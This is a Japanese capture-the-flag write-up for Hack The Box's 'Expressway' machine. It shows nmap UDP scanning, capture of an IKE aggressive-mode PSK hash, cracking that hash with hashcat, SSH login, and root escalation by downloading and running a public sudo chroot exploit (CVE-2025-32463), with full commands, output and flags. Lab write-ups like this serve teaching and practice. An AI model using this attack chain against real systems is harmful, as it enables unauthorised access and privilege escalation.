# Expressway

## 探索


### ポートスキャン

```
┌──(kali㉿kali)-[~/htb/Expressway]
└─$ nmap -sCV 10.129.4.226
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-26 22:24 EST
Stats: 0:03:27 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 22:28 (0:00:00 remaining)
Nmap scan report for 10.129.4.226
Host is up (0.24s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 254.78 seconds

```


TCPポートは22番 (SSH) しか開いていないことがわかります。このようにTCP側が極端に閉じている場合、HTBの定石として次はUDPポートの探索に切り替えるのが正解です。

特にこのマシンの名前「Expressway（高速道路）」や、ヒントにある「Interstate 500」などは、**UDP 500番ポート（IKE/VPN）**を示唆しています。

以下の手順で進めてみてください。

1. UDPポートのスキャン
まずは、標的がUDP 500番ポート（ISAKMP/IKE）を開放しているか確認します。

```
┌──(kali㉿kali)-[~/htb/Expressway]
└─$ sudo nmap -sU 10.129.6.223
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-30 01:58 EST
Nmap scan report for 10.129.6.223
Host is up (0.17s latency).
Not shown: 996 closed udp ports (port-unreach)
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
500/udp  open          isakmp
4500/udp open|filtered nat-t-ike

Nmap done: 1 IP address (1 host up) scanned in 1019.76 seconds

```


500/udp: IKE (Internet Key Exchange) - VPN接続の確立に使われます。

4500/udp: NATトラバーサル用。

2. IKEプロトコルの詳細調査 (ike-scan)
500番が開いていたら、ike-scan を使って詳細な情報を取得します。特に、脆弱な「Aggressive Mode」が有効かどうかを確認するのが鍵です。
```
┌──(kali㉿kali)-[~/htb/Expressway]
└─$ sudo nmap -sU -p 500,4500 --min-rate 1000 10.129.4.226
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-26 22:31 EST
Nmap scan report for 10.129.4.226
Host is up (0.19s latency).

PORT     STATE         SERVICE
500/udp  open          isakmp
4500/udp open|filtered nat-t-ike

Nmap done: 1 IP address (1 host up) scanned in 2.30 seconds

```

UDP 500番ポート (isakmp) が open になっていますね！これで進むべき道が確定しました。

次は、VPNのネゴシエーション（やり取り）を詳しく調べて、ログインに必要な情報を引き出します。

ステップ 2: ike-scan で Aggressive Mode を調査
IKEプロトコルには「Main Mode」と「Aggressive Mode」がありますが、Aggressive Mode は認証用のハッシュを暗号化せずに送信してしまう弱点があります。

以下のコマンドを実行して、ターゲットが Aggressive Mode に対応しているか、またユーザーIDが露出するかを確認してください

```
#┌──(kali㉿kali)-[~/htb/Expressway]
└─$ sudo ike-scan --aggressive 10.129.4.226
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.4.226    Aggressive Mode Handshake returned HDR=(CKY-R=2704d2e4aa31f6b6) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.255 seconds (3.93 hosts/sec).  1 returned handshake; 0 returned notify
```


ID (Value=ike@expressway.htb): これがVPN（およびおそらくSSH）のユーザー名になります。

Auth=PSK: 事前共有鍵（パスワード）が使われています。

Hash(20 bytes): パスワードのハッシュが手元に届きました。

次は、このハッシュを解析して実際のパスワードを特定します。


まずは ike-scan を使って、解析ツール（Hashcat）が読み込める形式でハッシュをファイルに書き出します。

1. ハッシュの抽出
以下のコマンドを実行してください。--id には先ほど判明した値を指定します。
```
┌──(kali㉿kali)-[~/htb/Expressway]
└─$ sudo ike-scan --aggressive --pskcrack=hash.txt --id=ike@expressway.htb 10.129.4.226
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.4.226    Aggressive Mode Handshake returned HDR=(CKY-R=c3162c4b8d518251) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.233 seconds (4.28 hosts/sec).  1 returned handshake; 0 returned notify
```


パスワード解析

-m 5400: IKE-PSK (SHA1) 用の解析モードを指定しています。

hash.txt: 先ほど保存したハッシュファイルです。

/usr/share/wordlists/rockyou.txt: Kali Linux標準の強力なパスワードリストです。

```
┌──(kali㉿kali)-[~/htb/Expressway]
└─$ hashcat -m 5400 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-AMD Ryzen 5 5500U with Radeon Graphics, 1430/2860 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Initializing backend runtime for device #1. Please be patient...
6ee6e0cc5223814943734f7909d73be2b34fef69a61a4223348c9d8e0b71dd7c8ae42b16fc661ad9f4f363e9ae6664f289a9d878a6cdeeb5970553e4a45f81ebf0c1223d13805aa1dbaf012ab20b567d8fcecac325d29b442de1f88024648da28c6a7634df6ef0480aeae064436d464fa0c7f91efe024c81899e8f098e6c0db2:2bb25f26cd391bc9d6bd3c6ac2ea99a6b5c1649ea0986d6f915fc7bf775bf1caa25dda84717445ea8c53e4b94bb38ddf5305845cfc8e87feb3566fcc8fbb02410deb564fbff745cd1048d4bb680d55b7d914a272943c14b323c0b155397567a0a9b1be94977f7d251ee400bc9fb788eeb85bebe64cf27a0350ca46b988ac855a:c3162c4b8d518251:3963fb0707480b96:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e68:aa55d46b8e9fbe392fba93a15685841c4f43d127:fb025367b4802b4c1d94a7c341d92d11157626e5edfaef9db83bf3d2ca9a9c71:b850d63ec17d4f91c3879f242012739b61e02db8:freakingrockstarontheroad
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5400 (IKE-PSK SHA1)
Hash.Target......: 6ee6e0cc5223814943734f7909d73be2b34fef69a61a4223348...e02db8
Time.Started.....: Mon Jan 26 22:36:03 2026 (1 min, 8 secs)
Time.Estimated...: Mon Jan 26 22:37:11 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   137.2 kH/s (10.93ms) @ Accel:624 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8047104/14344385 (56.10%)
Rejected.........: 0/8047104 (0.00%)
Restore.Point....: 8044608/14344385 (56.08%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: freaky143 -> franzgabby
Hardware.Mon.#01.: Util: 91%

Started: Mon Jan 26 22:34:21 2026
Stopped: Mon Jan 26 22:37:13 2026
```

一番最後に表示されている文字列がパスワードです： freakingrockstarontheroad


## 初期侵入


```
┌──(kali㉿kali)-[~/htb/Expressway]
└─$ ssh ike@10.129.4.226
The authenticity of host '10.129.4.226 (10.129.4.226)' can't be established.
ED25519 key fingerprint is: SHA256:fZLjHktV7oXzFz9v3ylWFE4BS9rECyxSHdlLrfxRM8g
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.4.226' (ED25519) to the list of known hosts.
ike@10.129.4.226's password: 
Last login: Wed Sep 17 12:19:40 BST 2025 from 10.10.14.64 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jan 27 03:42:05 2026 from 10.10.15.61
ike@expressway:~$ whoami
ike
ike@expressway:~$ ls
user.txt
ike@expressway:~$ cat user.txt
4ec1836b7ad60c1789161a609b3252ad
```

### user flag

`4ec1836b7ad60c1789161a609b3252ad`

```
ike@expressway:~$ id
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)

```

## 権限昇格

```
ike@expressway:~$ which sudo
/usr/local/bin/sudo
```

which sudo -> /usr/local/bin/sudo: 通常、sudoは /usr/bin/sudo にありますが、あえて別の場所にカスタムインストールされています。これは「ここを狙え」という制作者からのサインです。

```
ike@expressway:~$ sudo --version
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

Sudo version 1.9.17: このバージョンは、2025年に発見された非常に強力な脆弱性 CVE-2025-32463（通称：chwoot）の対象です

### CVE-2025-32463 (chwoot) の実行

この脆弱性は、sudoの chroot 処理の不備を突いて、本来アクセスできないルートディレクトリ外のファイルを実行したり、権限を昇格させたりできるものです。

```
ike@expressway:~$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux forky/sid"
NAME="Debian GNU/Linux"
VERSION_CODENAME=forky
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```


1. エクスプロイトコードの準備（自分のマシンで実行）
自分のKali Linuxで、スクリプトをダウンロードします

```
┌──(kali㉿kali)-[~/htb/Expressway]
└─$ wget https://github.com/pr0v3rbs/CVE-2025-32463_chwoot/raw/main/sudo-chwoot.sh
--2026-01-26 22:45:16--  https://github.com/pr0v3rbs/CVE-2025-32463_chwoot/raw/main/sudo-chwoot.sh
Resolving github.com (github.com)... 20.27.177.113
Connecting to github.com (github.com)|20.27.177.113|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/pr0v3rbs/CVE-2025-32463_chwoot/main/sudo-chwoot.sh [following]
--2026-01-26 22:45:16--  https://raw.githubusercontent.com/pr0v3rbs/CVE-2025-32463_chwoot/main/sudo-chwoot.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1046 (1.0K) [text/plain]
Saving to: ‘sudo-chwoot.sh’

sudo-chwoot.sh            100%[====================================>]   1.02K  --.-KB/s    in 0s      

2026-01-26 22:45:16 (7.34 MB/s) - ‘sudo-chwoot.sh’ saved [1046/1046]

                                                                                                       
┌──(kali㉿kali)-[~/htb/Expressway]
└─$ ls
hash.txt  sudo-chwoot.sh
```

2. ターゲットへ転送
scp を使って、ターゲットの /tmp ディレクトリに送ります。
```
┌──(kali㉿kali)-[~/htb/Expressway]
└─$ scp sudo-chwoot.sh ike@10.129.4.226:/tmp/exp.sh
ike@10.129.4.226's password: 
sudo-chwoot.sh                                                       100% 1046     5.3KB/s   00:00

```

3. 実行してRoot奪取（ターゲットマシンで実行）
ターゲットのSSH画面に戻り、実行権限を与えて動かします。
```
ike@expressway:~$ chmod +x /tmp/exp.sh
/tmp/exp.sh
woot!
root@expressway:/# whoami
root
```

```
root@expressway:/# ls
bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  sys  usr  vmlinuz
boot  etc  initrd.img  lib             lost+found  mnt    proc  run   srv   tmp  var  vmlinuz.old
root@expressway:/# cat /root/root.txt
6e58dd25a7226a768c11b136ed06598d


```